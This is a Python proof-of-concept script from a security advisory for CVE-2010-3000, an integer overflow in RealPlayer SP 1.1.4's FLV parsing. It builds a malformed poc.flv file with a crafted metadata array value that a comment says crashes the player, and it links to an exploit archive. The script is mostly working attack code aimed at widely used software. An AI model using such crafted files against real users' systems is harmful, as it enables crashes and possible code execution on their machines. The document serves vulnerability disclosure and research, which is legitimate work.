'''
  __  __  ____         _    _ ____ 
 |  \/  |/ __ \   /\  | |  | |  _ \
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ <
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/
 
'''

'''
Title    : RealPlayer FLV Parsing Multiple Integer Overflow
Version	 : RealPlayer SP 1.1.4
Analysis : http://www.abysssec.com
Vendor	 : http://www.real.com
Impact	 : High
Contact	 : shahin [at] abysssec.com , info [at] abysssec.com
Twitter	 : @abysssec
CVE      : CVE-2010-3000
'''


# POC for CVE-2010-3000
# http://www.exploit-db.com/moaub-13-realplayer-flv-parsing-multiple-integer-overflow/
# https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/14992.zip (moaub-13-exploit.zip)

import sys

def main():

	flvHeader = '\x46\x4C\x56\x01\x05\x00\x00\x00\x09'
	flvBody1 = '\x00\x00\x00\x00\x12\x00\x00\x15\x00\x00\x00\x00\x00\x00\x00\x02\x00\x0A\x6F\x6E\x4D\x65\x74\x61\x44\x61\x74\x61\x08'
	HX_FLV_META_AMF_TYPE_MIXEDARRAY_Value = "\x07\x50\x75\x08"   #  if value >= 0x7507508   --> crash
	flvBody2  = "\x00\x00\x09\x00\x00\x00\x20"
	
	flv = open('poc.flv', 'wb+')
	flv.write(flvHeader)
	flv.write(flvBody1)
	flv.write(HX_FLV_META_AMF_TYPE_MIXEDARRAY_Value)
	flv.write(flvBody2)
	
	flv.close()
	print '[-] FLV file generated'
	
if __name__ == '__main__':
    main()